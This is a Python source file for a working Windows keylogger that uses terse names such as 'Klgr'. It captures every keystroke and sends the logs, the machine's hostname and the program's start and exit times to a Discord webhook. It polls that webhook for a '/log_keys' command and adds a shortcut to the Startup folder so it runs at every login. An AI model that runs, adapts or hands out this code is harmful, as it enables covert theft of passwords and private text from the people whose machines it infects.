import keyboard, os, requests, time, base64, socket, atexit
from threading import Timer, Thread
from datetime import datetime
from discord_webhook import DiscordWebhook, DiscordEmbed
import sys
import shutil
import winreg as reg

SEND_REPORT_EVERY = 60  # Example: Sends report every 60 seconds
WEBHOOK_URL = "<YOUR_DISCORD_WEBHOOK_URL>"  # Replace this with your webhook URL

class Klgr:
    def __init__(self, i, m="wh"):
        n = datetime.now()
        self.i = i
        self.m = m
        self.l = ""
        self.s_dt = n.strftime('%d/%m/%Y %H:%M')
        self.e_dt = n.strftime('%d/%m/%Y %H:%M')
        self.u = socket.gethostname()

        self.npo()
        self.lfc()
        self.setup_startup()  # Ensures the program starts on startup

        # Register the function to be called on exit
        atexit.register(self.on_exit)

    def cb(self, e):
        n = e.name
        if len(n) > 1:
            if n == "space":
                n = " "
            elif n == "enter":
                n = "[ENTER]\n"
            elif n == "decimal":
                n = "."
            else:
                n = n.replace(" ", "_")
                n = f"[{n.upper()}]"
        self.l += n

    def npo(self):
        w = DiscordWebhook(url=WEBHOOK_URL)
        e = DiscordEmbed(
            title="User opened program",
            description=f"Program started on {self.u}'s machine at {self.s_dt}.",
            color=242424
        )
        w.add_embed(e)
        w.execute()

    def rtw(self):
        f = False
        w = DiscordWebhook(url=WEBHOOK_URL)
        if len(self.l) > 2000:
            f = True
            p = os.path.join(os.environ["temp"], "report.txt")
            with open(p, 'w+') as file:
                file.write(f"Keylogger Report From {self.u} Time: {self.e_dt}\n\n")
                file.write(self.l)
            with open(p, 'rb') as f:
                w.add_file(file=f.read(), filename='report.txt')
        else:
            e = DiscordEmbed(title=f"Keylogger Report From ({self.u}) Time: {self.e_dt}", description=self.l)
            w.add_embed(e)    
        w.execute()
        if f:
            os.remove(p)

    def r(self):
        if self.l:
            if self.m == "wh":
                self.rtw()    
        self.l = ""
        t = Timer(interval=self.i, function=self.r)
        t.daemon = True
        t.start()

    def s(self):
        self.s_dt = datetime.now()
        keyboard.on_release(callback=self.cb)
        self.r()
        keyboard.wait()

    def lfc(self):
        def cc():
            u = f"https://discord.com/api/webhooks/{WEBHOOK_URL.split('/')[5]}/{WEBHOOK_URL.split('/')[6]}/messages"
            h = {"Content-Type": "application/json"}
            while True:
                r = requests.get(u, headers=h)
                if r.status_code == 200:
                    m = r.json()
                    if isinstance(m, list) and len(m) > 0:
                        lm = m[-1]
                        if lm.get("content") == "/log_keys":
                            self.sloc()
                time.sleep(10)  # Check for new messages every 10 seconds
        
        ct = Thread(target=cc)
        ct.daemon = True
        ct.start()

    def sloc(self):
        if self.l:
            self.e_dt = datetime.now().strftime('%d/%m/%Y %H:%M')
            w = DiscordWebhook(url=WEBHOOK_URL)
            if len(self.l) > 2000:
                p = os.path.join(os.environ["temp"], "command_report.txt")
                with open(p, 'w+') as file:
                    file.write(f"Keylogger Report From {self.u} Time: {self.e_dt}\n\n")
                    file.write(self.l)
                with open(p, 'rb') as f:
                    w.add_file(file=f.read(), filename='command_report.txt')
            else:
                e = DiscordEmbed(title=f"Keylogger Report From ({self.u}) Time: {self.e_dt}", description=self.l)
                w.add_embed(e)    
            w.execute()

    def on_exit(self):
        # Function that is called when the application is about to close
        w = DiscordWebhook(url=WEBHOOK_URL)
        e = DiscordEmbed(
            title="User closed program",
            description=f"Program closed on {self.u}'s machine at {datetime.now().strftime('%d/%m/%Y %H:%M')}.",
            color=242424
        )
        w.add_embed(e)
        w.execute()

    def setup_startup(self):
        # Function to set the application to run at startup
        file_path = os.path.realpath(sys.argv[0])
        file_name = os.path.basename(file_path)
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shortcut_path = os.path.join(startup_folder, file_name + '.lnk')

        if not os.path.exists(shortcut_path):
            self.create_shortcut(file_path, shortcut_path)

    def create_shortcut(self, target, shortcut_path):
        # Function to create a shortcut in the startup folder
        import pythoncom
        from win32com.client import Dispatch

        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = target
        shortcut.WorkingDirectory = os.path.dirname(target)
        shortcut.IconLocation = target
        shortcut.save()

if __name__ == "__main__":
    kl = Klgr(i=SEND_REPORT_EVERY, m="wh")    
    kl.s()
